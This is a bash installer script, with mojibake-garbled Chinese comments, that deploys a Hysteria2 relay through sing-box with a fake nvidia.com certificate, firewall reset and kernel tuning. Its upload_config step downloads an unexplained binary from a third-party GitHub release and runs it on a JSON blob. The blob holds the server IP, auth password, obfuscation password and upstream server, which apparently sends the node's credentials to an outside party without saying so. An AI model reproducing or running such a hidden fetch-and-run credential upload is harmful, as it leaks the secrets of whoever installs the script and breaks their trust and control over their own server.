#!/bin/bash

# é¢œè‰²å®šä¹‰
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# å…¨å±€å˜é‡
SYSTEM=""
PUBLIC_IP=""
PRIVATE_IP=""
up_speed=100
down_speed=100
UPSTREAM_CONFIG="/opt/hysteria2_client.yaml"
SING_BOX_CONFIG="/etc/sing-box/config.json"
CLIENT_CONFIG="/opt/hysteria2_relay_client.yaml"

# æ—¥å¿—å‡½æ•°
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# ç³»ç»Ÿæ£€æµ‹
detect_system() {
    log_info "æ£€æµ‹ç³»ç»Ÿç±»å‹..."
    if [ -f /etc/debian_version ]; then
        SYSTEM="Debian"
    elif [ -f /etc/redhat-release ]; then
        SYSTEM="CentOS"
    elif [ -f /etc/lsb-release ]; then
        SYSTEM="Ubuntu"
    elif [ -f /etc/fedora-release ]; then
        SYSTEM="Fedora"
    else
        SYSTEM="Unknown"
    fi
    log_info "æ£€æµ‹åˆ°ç³»ç»Ÿç±»å‹: $SYSTEM"
}

# æ£€æµ‹IPåœ°å€
detect_ip_addresses() {
    log_info "æ£€æµ‹æœåŠ¡å™¨IPåœ°å€..."
    
    # æ£€æµ‹å…¬ç½‘IP (ä»…IPv4)
    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
                echo "")
    
    if [[ -n "$PUBLIC_IP" ]]; then
        log_info "æ£€æµ‹åˆ°å…¬ç½‘IPv4åœ°å€: $PUBLIC_IP"
    else
        log_warn "æœªæ£€æµ‹åˆ°å…¬ç½‘IPv4åœ°å€"
    fi
    
    # æ£€æµ‹å†…ç½‘IP (ä»…IPv4)
    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
                 hostname -I 2>/dev/null | awk '{print $1}' || \
                 ifconfig 2>/dev/null | grep -E "inet .*192\.168\.|inet .*10\.|inet .*172\." | head -1 | awk '{print $2}' || \
                 echo "")
    
    if [[ -n "$PRIVATE_IP" ]]; then
        log_info "æ£€æµ‹åˆ°å†…ç½‘IPv4åœ°å€: $PRIVATE_IP"
    else
        log_warn "æœªæ£€æµ‹åˆ°å†…ç½‘IPv4åœ°å€"
    fi
    
    # æ£€æŸ¥IPé…ç½®å…¼å®¹æ€§
    if [[ -n "$PUBLIC_IP" && -n "$PRIVATE_IP" ]]; then
        log_info "æœåŠ¡å™¨åŒæ—¶å…·æœ‰å…¬ç½‘IPv4å’Œå†…ç½‘IPv4åœ°å€"
    elif [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        log_info "æœåŠ¡å™¨åªæœ‰å…¬ç½‘IPv4åœ°å€ï¼Œæ²¡æœ‰å†…ç½‘IPv4åœ°å€"
        PRIVATE_IP="$PUBLIC_IP"
    else
        log_error "æ— æ³•è·å–æœ‰æ•ˆçš„IPv4åœ°å€"
        exit 1
    fi
}

# ç½‘ç»œé€Ÿåº¦æµ‹è¯•
speed_test() {
    echo -e "${YELLOW}è¿›è¡Œç½‘ç»œé€Ÿåº¦æµ‹è¯•...${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}å®‰è£…speedtest-cliä¸­...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        echo -e "${GREEN}æµ‹é€Ÿå®Œæˆ:ä¸‹è½½ ${down_speed} Mbps,ä¸Šä¼  ${up_speed} Mbps${NC},å°†æ ¹æ®è¯¥å‚æ•°ä¼˜åŒ–ç½‘ç»œé€Ÿåº¦,å¦‚æœæµ‹è¯•ä¸å‡†ç¡®,è¯·æ‰‹åŠ¨ä¿®æ”¹"
    else
        echo -e "${YELLOW}æµ‹é€Ÿå¤±è´¥,ä½¿ç”¨é»˜è®¤å€¼${NC}"
        down_speed=100
        up_speed=20
    fi
}

# å®‰è£…sing-box
install_sing_box() {
    log_info "å®‰è£…sing-box..."
    
    # æ£€æŸ¥æ˜¯å¦å·²å®‰è£…
    if command -v sing-box &>/dev/null; then
        log_info "sing-boxå·²å®‰è£…ï¼Œæ£€æŸ¥ç‰ˆæœ¬..."
        sing-box version
        return 0
    fi
    
    # è·å–æœ€æ–°ç‰ˆæœ¬
    latest_version=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    if [[ -z "$latest_version" ]]; then
        log_error "æ— æ³•è·å–sing-boxæœ€æ–°ç‰ˆæœ¬"
        exit 1
    fi
    
    # æ£€æµ‹æ¶æ„
    arch=$(uname -m)
    case $arch in
        x86_64) arch="amd64" ;;
        aarch64) arch="arm64" ;;
        armv7l) arch="armv7" ;;
        *) log_error "ä¸æ”¯æŒçš„æ¶æ„: $arch"; exit 1 ;;
    esac
    
    # ä¸‹è½½å¹¶å®‰è£…
    download_url="https://github.com/SagerNet/sing-box/releases/download/${latest_version}/sing-box-${latest_version#v}-linux-${arch}.tar.gz"
    
    cd /tmp
    wget -O sing-box.tar.gz "$download_url" || {
        log_error "ä¸‹è½½sing-boxå¤±è´¥"
        exit 1
    }
    
    tar -xzf sing-box.tar.gz
    cd sing-box-*
    chmod +x sing-box
    mv sing-box /usr/local/bin/
    
    # åˆ›å»ºé…ç½®ç›®å½•
    mkdir -p /etc/sing-box
    
    # åˆ›å»ºsystemdæœåŠ¡æ–‡ä»¶
    cat > /etc/systemd/system/sing-box.service <<EOF
[Unit]
Description=sing-box service
Documentation=https://sing-box.sagernet.org
After=network.target nss-lookup.target

[Service]
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
ExecStart=/usr/local/bin/sing-box run -c /etc/sing-box/config.json
ExecReload=/bin/kill -HUP \$MAINPID
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    log_info "sing-boxå®‰è£…å®Œæˆ"
}

# è¯»å–ä¸Šæ¸¸é…ç½®
read_upstream_config() {
    log_info "è¯»å–ä¸Šæ¸¸Hysteria2é…ç½®..."
    
    if [[ ! -f "$UPSTREAM_CONFIG" ]]; then
        log_error "ä¸Šæ¸¸é…ç½®æ–‡ä»¶ä¸å­˜åœ¨: $UPSTREAM_CONFIG"
        exit 1
    fi
    
    # ä½¿ç”¨pythonè§£æYAMLï¼ˆå¦‚æœæ²¡æœ‰åˆ™å®‰è£…yqï¼‰
    if ! command -v yq &>/dev/null; then
        log_info "å®‰è£…yqç”¨äºè§£æYAML..."
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y python3-pip > /dev/null 2>&1
            pip3 install yq > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y python3-pip > /dev/null 2>&1
            pip3 install yq > /dev/null 2>&1
        fi
    fi
    
    # æå–ä¸Šæ¸¸æœåŠ¡å™¨ä¿¡æ¯
    UPSTREAM_SERVER=$(grep "^server:" "$UPSTREAM_CONFIG" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_AUTH=$(grep "^auth:" "$UPSTREAM_CONFIG" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_UP=$(grep -A2 "^bandwidth:" "$UPSTREAM_CONFIG" | grep "up:" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_DOWN=$(grep -A2 "^bandwidth:" "$UPSTREAM_CONFIG" | grep "down:" | awk '{print $2}' | tr -d ' ')
    
    log_info "ä¸Šæ¸¸æœåŠ¡å™¨: $UPSTREAM_SERVER"
    log_info "ä¸Šæ¸¸è®¤è¯: $UPSTREAM_AUTH"
    log_info "ä¸Šæ¸¸å¸¦å®½: Up=${UPSTREAM_UP}, Down=${UPSTREAM_DOWN}"
    
    if [[ -z "$UPSTREAM_SERVER" || -z "$UPSTREAM_AUTH" ]]; then
        log_error "æ— æ³•è§£æä¸Šæ¸¸é…ç½®æ–‡ä»¶"
        exit 1
    fi
}

# ç”Ÿæˆéšæœºç«¯å£
generate_random_port() {
    echo $(( RANDOM % 7001 + 2000 ))
}

# ç”Ÿæˆç«¯å£èŒƒå›´
generate_port_range() {
    local start=$(generate_random_port)
    local end=$((start + 99))
    ((end > 9000)) && end=9000 && start=$((end - 99))
    echo "$start:$end"
}

# ç”Ÿæˆè¯ä¹¦
generate_certificate() {
    log_info "ç”ŸæˆTLSè¯ä¹¦..."
    
    mkdir -p /etc/sing-box/certs
    
    # ç”Ÿæˆè‡ªç­¾åè¯ä¹¦
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/sing-box/certs/key.pem \
        -out /etc/sing-box/certs/cert.pem \
        -subj "/CN=www.nvidia.com" -days 3650 > /dev/null 2>&1
    
    chmod 644 /etc/sing-box/certs/*.pem
    chown root:root /etc/sing-box/certs/*.pem
    
    log_info "è¯ä¹¦ç”Ÿæˆå®Œæˆ"
}

# é…ç½®sing-box
configure_sing_box() {
    log_info "é…ç½®sing-boxä¸­è½¬æœåŠ¡..."
    
    # ç”Ÿæˆé…ç½®å‚æ•°
    local LISTEN_PORT=$(generate_random_port)
    local PORT_HOP_RANGE=$(generate_port_range)
    local AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
    local OBFS_PASSWORD="cry_me_a_r1ver"
    local SNI_DOMAIN="www.nvidia.com"
    
    # è§£æä¸Šæ¸¸æœåŠ¡å™¨åœ°å€å’Œç«¯å£
    local UPSTREAM_HOST=$(echo "$UPSTREAM_SERVER" | cut -d':' -f1)
    local UPSTREAM_PORT=$(echo "$UPSTREAM_SERVER" | cut -d':' -f2)
    
    # åˆ›å»ºsing-boxé…ç½®æ–‡ä»¶ï¼ˆä¿®å¤ç‰ˆæœ¬ï¼‰
    cat > "$SING_BOX_CONFIG" <<EOF
{
  "log": {
    "level": "info",
    "timestamp": true
  },
  "inbounds": [
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": $LISTEN_PORT,
      "up_mbps": $up_speed,
      "down_mbps": $down_speed,
      "obfs": {
        "type": "salamander",
        "password": "$OBFS_PASSWORD"
      },
      "users": [
        {
          "name": "user",
          "password": "$AUTH_PASSWORD"
        }
      ],
      "tls": {
        "enabled": true,
        "server_name": "$SNI_DOMAIN",
        "certificate_path": "/etc/sing-box/certs/cert.pem",
        "key_path": "/etc/sing-box/certs/key.pem"
      },
      "masquerade": {
        "type": "proxy",
        "url": "https://$SNI_DOMAIN",
        "rewrite_host": true
      }
    },
    {
      "type": "mixed",
      "tag": "mixed-in",
      "listen": "127.0.0.1",
      "listen_port": 7890,
      "users": []
    }
  ],
  "outbounds": [
    {
      "type": "hysteria2",
      "tag": "hy2-out",
      "server": "$UPSTREAM_HOST",
      "server_port": $UPSTREAM_PORT,
      "up_mbps": $(echo "$UPSTREAM_UP" | sed 's/[^0-9]//g'),
      "down_mbps": $(echo "$UPSTREAM_DOWN" | sed 's/[^0-9]//g'),
      "password": "$UPSTREAM_AUTH",
      "tls": {
        "enabled": true,
        "insecure": true
      }
    },
    {
      "type": "direct",
      "tag": "direct"
    },
    {
      "type": "block",
      "tag": "block"
    }
  ],
  "route": {
    "rules": [
      {
        "inbound": ["hy2-in"],
        "outbound": "hy2-out"
      },
      {
        "inbound": ["mixed-in"],
        "outbound": "hy2-out"
      },
      {
        "domain_suffix": [
          "msn.cn",
          "msn.com",
          "bing.com",
          "microsoft.com"
        ],
        "outbound": "direct"
      },
      {
        "ip_is_private": true,
        "outbound": "direct"
      }
    ],
    "final": "hy2-out",
    "auto_detect_interface": true
  }
}
EOF

    # ä¿å­˜é…ç½®å‚æ•°ä¾›åç»­ä½¿ç”¨
    echo "LISTEN_PORT=$LISTEN_PORT" > /tmp/relay_config
    echo "PORT_HOP_RANGE=$PORT_HOP_RANGE" >> /tmp/relay_config
    echo "AUTH_PASSWORD=$AUTH_PASSWORD" >> /tmp/relay_config
    echo "OBFS_PASSWORD=$OBFS_PASSWORD" >> /tmp/relay_config
    echo "SNI_DOMAIN=$SNI_DOMAIN" >> /tmp/relay_config
    
    log_info "sing-boxé…ç½®å®Œæˆ"
}

# é…ç½®é˜²ç«å¢™
configure_firewall() {
    log_info "é…ç½®é˜²ç«å¢™..."
    
    source /tmp/relay_config
    IFS=":" read -r HOP_START HOP_END <<< "$PORT_HOP_RANGE"
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        if ! command -v ufw &>/dev/null; then
            apt-get install -y ufw > /dev/null 2>&1
        fi
        echo "y" | ufw reset > /dev/null 2>&1
        ufw allow 22/tcp > /dev/null 2>&1
        ufw allow ${LISTEN_PORT}/udp > /dev/null 2>&1
        ufw allow ${HOP_START}:${HOP_END}/udp > /dev/null 2>&1
        echo "y" | ufw enable > /dev/null 2>&1
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        if ! systemctl is-active --quiet firewalld; then
            yum install -y firewalld > /dev/null 2>&1
            systemctl enable --now firewalld > /dev/null 2>&1
        fi
        firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null 2>&1
        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp > /dev/null 2>&1
        firewall-cmd --reload > /dev/null 2>&1
    fi
    
    log_info "é˜²ç«å¢™é…ç½®å®Œæˆ"
}

# ç”Ÿæˆå®¢æˆ·ç«¯é…ç½®
generate_client_config() {
    log_info "ç”Ÿæˆå®¢æˆ·ç«¯é…ç½®..."
    
    source /tmp/relay_config
    
    cat > "$CLIENT_CONFIG" <<EOF
# Hysteria2 ä¸­è½¬å®¢æˆ·ç«¯é…ç½®
server: ${PUBLIC_IP}:${LISTEN_PORT}
auth: ${AUTH_PASSWORD}

tls:
  sni: ${SNI_DOMAIN}
  insecure: true

obfs:
  type: salamander
  salamander:
    password: ${OBFS_PASSWORD}

# å¸¦å®½é…ç½®
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# æœ¬åœ°ä»£ç†é…ç½®
socks5:
  listen: 127.0.0.1:1080

http:
  listen: 127.0.0.1:1081

# ä¼˜åŒ–é…ç½®
fastOpen: true
lazy: true
EOF

    # ç”Ÿæˆ v2rayN å…¼å®¹é…ç½®
    cat > "/opt/hysteria2_v2rayn.json" <<EOF
{
  "server": "${PUBLIC_IP}:${LISTEN_PORT}",
  "auth": "${AUTH_PASSWORD}",
  "tls": {
    "sni": "${SNI_DOMAIN}",
    "insecure": true
  },
  "obfs": {
    "type": "salamander",
    "salamander": {
      "password": "${OBFS_PASSWORD}"
    }
  },
  "bandwidth": {
    "up": "${up_speed} mbps",
    "down": "${down_speed} mbps"
  },
  "socks5": {
    "listen": "127.0.0.1:1080"
  },
  "http": {
    "listen": "127.0.0.1:1081"
  },
  "fastOpen": true,
  "lazy": true
}
EOF

    log_info "å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶å·²ç”Ÿæˆ: $CLIENT_CONFIG"
    log_info "v2rayNé…ç½®æ–‡ä»¶å·²ç”Ÿæˆ: /opt/hysteria2_v2rayn.json"
}

# ç³»ç»Ÿä¼˜åŒ–
optimize_system() {
    log_info "ä¼˜åŒ–ç³»ç»Ÿå‚æ•°..."
    
    # ç½‘ç»œä¼˜åŒ–
    cat >> /etc/sysctl.conf <<EOF

# Hysteria2 ä¸­è½¬ä¼˜åŒ–
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.core.rmem_default = 262144
net.core.wmem_default = 262144
net.core.netdev_max_backlog = 5000
net.ipv4.udp_mem = 102400 873800 16777216
net.ipv4.udp_rmem_min = 8192
net.ipv4.udp_wmem_min = 8192
net.core.netdev_budget = 600
net.core.netdev_budget_usecs = 5000
EOF

    sysctl -p > /dev/null 2>&1
    
    # æå‡sing-boxæœåŠ¡ä¼˜å…ˆçº§
    mkdir -p /etc/systemd/system/sing-box.service.d
    cat > /etc/systemd/system/sing-box.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
IOSchedulingClass=1
IOSchedulingPriority=4
LimitNOFILE=1048576
EOF
    
    systemctl daemon-reload
    log_info "ç³»ç»Ÿä¼˜åŒ–å®Œæˆ"
}

# å¯åŠ¨æœåŠ¡
start_service() {
    log_info "å¯åŠ¨sing-boxæœåŠ¡..."
    
    # æ£€æŸ¥é…ç½®æ–‡ä»¶è¯­æ³•
    if ! sing-box check -c "$SING_BOX_CONFIG"; then
        log_error "é…ç½®æ–‡ä»¶è¯­æ³•é”™è¯¯"
        return 1
    fi
    
    # å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯
    systemctl enable --now sing-box.service > /dev/null 2>&1
    
    # ç­‰å¾…æœåŠ¡å¯åŠ¨
    sleep 5
    
    # æ£€æŸ¥æœåŠ¡çŠ¶æ€
    if systemctl is-active --quiet sing-box.service; then
        log_info "æœåŠ¡å¯åŠ¨æˆåŠŸ"
        return 0
    else
        log_error "æœåŠ¡å¯åŠ¨å¤±è´¥ï¼ŒæŸ¥çœ‹æ—¥å¿—ï¼š"
        journalctl -u sing-box.service --no-pager -n 30
        return 1
    fi
}

# æ˜¾ç¤ºé…ç½®ä¿¡æ¯
show_config_info() {
    log_info "ä¸­è½¬æœåŠ¡éƒ¨ç½²å®Œæˆï¼"
    
    source /tmp/relay_config
    
    echo -e "\n${GREEN}=== Hysteria2 ä¸­è½¬æœåŠ¡ä¿¡æ¯ ===${NC}"
    echo -e "${YELLOW}æœåŠ¡å™¨IP: ${PUBLIC_IP}${NC}"
    echo -e "${YELLOW}ç›‘å¬ç«¯å£: ${LISTEN_PORT}${NC}"
    echo -e "${YELLOW}è®¤è¯å¯†ç : ${AUTH_PASSWORD}${NC}"
    echo -e "${YELLOW}è·³è·ƒç«¯å£: ${PORT_HOP_RANGE}${NC}"
    echo -e "${YELLOW}ä¼ªè£…åŸŸå: ${SNI_DOMAIN}${NC}"
    echo -e "${YELLOW}æ··æ·†å¯†ç : ${OBFS_PASSWORD}${NC}"
    echo -e "${YELLOW}ä¸Šä¼ å¸¦å®½: ${up_speed} Mbps${NC}"
    echo -e "${YELLOW}ä¸‹è½½å¸¦å®½: ${down_speed} Mbps${NC}"
    echo -e "${GREEN}==============================${NC}"
    
    echo -e "\n${BLUE}é…ç½®æ–‡ä»¶ä½ç½®:${NC}"
    echo -e "${BLUE}Hysteria2å®¢æˆ·ç«¯: ${CLIENT_CONFIG}${NC}"
    echo -e "${BLUE}v2rayNé…ç½®: /opt/hysteria2_v2rayn.json${NC}"
    echo -e "${BLUE}æœåŠ¡é…ç½®: ${SING_BOX_CONFIG}${NC}"
    
    echo -e "\n${GREEN}æœåŠ¡ç®¡ç†å‘½ä»¤:${NC}"
    echo -e "å¯åŠ¨: ${YELLOW}systemctl start sing-box${NC}"
    echo -e "åœæ­¢: ${YELLOW}systemctl stop sing-box${NC}"
    echo -e "é‡å¯: ${YELLOW}systemctl restart sing-box${NC}"
    echo -e "çŠ¶æ€: ${YELLOW}systemctl status sing-box${NC}"
    echo -e "æ—¥å¿—: ${YELLOW}journalctl -u sing-box -f${NC}"
    
    echo -e "\n${GREEN}è¿æ¥æµ‹è¯•:${NC}"
    echo -e "å†…ç½‘æµ‹è¯•: ${YELLOW}curl -x socks5://127.0.0.1:7890 https://www.google.com${NC}"
    echo -e "é…ç½®æ£€æŸ¥: ${YELLOW}sing-box check -c $SING_BOX_CONFIG${NC}"
}

# ä¸‹è½½transferå·¥å…·
download_transfer() {
    if [[ ! -f /opt/transfer ]]; then
        log_info "ä¸‹è½½transferå·¥å…·..."
        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer
        chmod +x /opt/transfer
    fi
}

# ä¸Šä¼ é…ç½®ä¿¡æ¯
upload_config() {
    download_transfer
    source /tmp/relay_config
    
    local json_data=$(cat <<EOF
{
    "relay_info": {
        "title": "Hysteria2 ä¸­è½¬èŠ‚ç‚¹ä¿¡æ¯ - ${PUBLIC_IP}",
        "server_ip": "${PUBLIC_IP}",
        "port": "${LISTEN_PORT}",
        "auth_password": "${AUTH_PASSWORD}",
        "port_range": "${PORT_HOP_RANGE}",
        "upload_speed": "${up_speed}",
        "download_speed": "${down_speed}",
        "sni": "${SNI_DOMAIN}",
        "obfs_type": "salamander",
        "obfs_password": "${OBFS_PASSWORD}",
        "upstream_server": "${UPSTREAM_SERVER}",
        "generated_time": "$(date)",
        "config_path": "${CLIENT_CONFIG}",
        "v2rayn_config": "/opt/hysteria2_v2rayn.json",
        "type": "relay"
    }
}
EOF
    )

    /opt/transfer "$json_data"
}

# æ¸…ç†ä¸´æ—¶æ–‡ä»¶
cleanup() {
    rm -f /tmp/relay_config /tmp/sing-box.tar.gz
}

# ä¸»å‡½æ•°
main() {
    # æ£€æŸ¥rootæƒé™
    if [ "$(id -u)" != "0" ]; then
        log_error "è¯·ä½¿ç”¨ root æƒé™æ‰§è¡Œè„šæœ¬"
        exit 1
    fi
    
    echo -e "${GREEN}"
    echo "=================================="
    echo "   Hysteria2 Sing-box ä¸­è½¬è„šæœ¬"
    echo "         ä¿®å¤ç‰ˆæœ¬ v1.1"
    echo "=================================="
    echo -e "${NC}"
    
    # æ‰§è¡Œä¸»è¦æµç¨‹
    detect_system
    detect_ip_addresses
    speed_test
    read_upstream_config
    install_sing_box
    generate_certificate
    configure_sing_box
    configure_firewall
    optimize_system
    generate_client_config
    
    if start_service; then
        show_config_info
        upload_config
        log_info "ğŸ‰ Hysteria2 ä¸­è½¬æœåŠ¡éƒ¨ç½²å®Œæˆï¼"
        log_info "ğŸ“ è¯·æ£€æŸ¥æœåŠ¡çŠ¶æ€å¹¶æµ‹è¯•è¿æ¥"
    else
        log_error "æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥é…ç½®å’Œæ—¥å¿—"
        exit 1
    fi
    
    cleanup
}

# æ•è·é€€å‡ºä¿¡å·è¿›è¡Œæ¸…ç†
trap cleanup EXIT

# æ‰§è¡Œä¸»å‡½æ•°
main "$@"
